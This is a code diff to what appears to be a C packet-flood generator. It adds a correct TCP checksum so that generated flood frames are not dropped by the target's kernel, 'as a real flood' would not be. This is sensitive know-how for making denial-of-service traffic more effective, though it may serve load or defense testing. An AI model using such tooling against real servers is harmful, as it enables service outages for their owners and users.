@@ -74,6 +74,32 @@ static uint16_t ip_checksum(const struct iphdr *ip)
     return (uint16_t)~sum;
 }
 
+// TCP checksum over the pseudo header: a flood with a wrong one is thrown
+// away by the server's kernel for nothing, which a real flood does not do
+static uint16_t tcp_checksum(const struct iphdr *ip, const uint8_t *segment, size_t len)
+{
+    uint32_t sum = 0;
+    sum += (ip->saddr >> 16) & 0xFFFF;
+    sum += ip->saddr & 0xFFFF;
+    sum += (ip->daddr >> 16) & 0xFFFF;
+    sum += ip->daddr & 0xFFFF;
+    sum += htons(IPPROTO_TCP);
+    sum += htons((uint16_t)len);
+    for (size_t i = 0; i + 1 < len; i += 2)
+    {
+        sum += (uint32_t)(segment[i] | (segment[i + 1] << 8));
+    }
+    if (len & 1)
+    {
+        sum += segment[len - 1];
+    }
+    while (sum >> 16)
+    {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    return (uint16_t)~sum;
+}
+
 // builds one frame of the configured kind; returns its length
 static size_t build(uint8_t *frame, uint64_t *rng)
 {
@@ -159,6 +185,7 @@ static size_t build(uint8_t *frame, uint64_t *rng)
         ((uint8_t *)th)[13] = flags;
         th->window = htons(64240);
         memcpy(th + 1, payload, payload_len);
+        th->check = tcp_checksum(ip, (const uint8_t *)th, l4_len);
     }
     else
     {
